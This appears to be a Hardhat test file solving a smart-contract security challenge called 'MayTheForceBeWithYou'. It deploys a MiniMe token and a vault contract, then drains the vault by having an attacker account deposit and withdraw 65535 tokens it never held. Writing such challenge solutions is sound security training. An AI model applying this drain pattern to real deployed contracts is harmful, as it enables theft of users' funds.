const { expect } = require("chai");
const { ethers } = require("hardhat");
//const { web3 } = require("web3");

describe("MayTheForceBeWithYou Challenge", function () {


  before(async function () {
    [deployer, attacker, temp] = await ethers.getSigners();


    const MiniMeToken = await ethers.getContractFactory("MiniMeToken", deployer);
    this.minimetoken = await MiniMeToken.deploy("Yoda Token", 18, "Yoda");

    const MayTheForceBeWithYou = await ethers.getContractFactory("MayTheForceBeWithYou", deployer);
    this.maytheforcebewithyou = await MayTheForceBeWithYou.deploy(this.minimetoken.address);

    await this.minimetoken.mint(this.maytheforcebewithyou.address, 65535);

    console.log("MayTheForceBeWithYou Contract Address : ", this.maytheforcebewithyou.address);
    console.log("MiniMeToken Contract Address : ", this.minimetoken.address);
    
    console.log(await this.minimetoken.balanceOf(this.maytheforcebewithyou.address));

  });

  it('Exploit', async function () {
    await this.maytheforcebewithyou.connect(attacker).deposit(65535);
    await this.maytheforcebewithyou.connect(attacker).withdraw(65535);
    

    // console.log(await this.maytheforcebewithyou.totalSupply());
    // console.log(await this.maytheforcebewithyou.balanceOf(attacker.address));
    
    // console.log(await this.minimetoken.balanceOf(attacker.address));
    console.log(await this.minimetoken.balanceOf(attacker.address));
    console.log(await this.minimetoken.balanceOf(this.maytheforcebewithyou.address));
  });

  after(async function () {
    // SUCCESS CONDITIONS
    expect(
      await this.minimetoken.balanceOf(this.maytheforcebewithyou.address)
    ).to.be.equal(0)
  });
});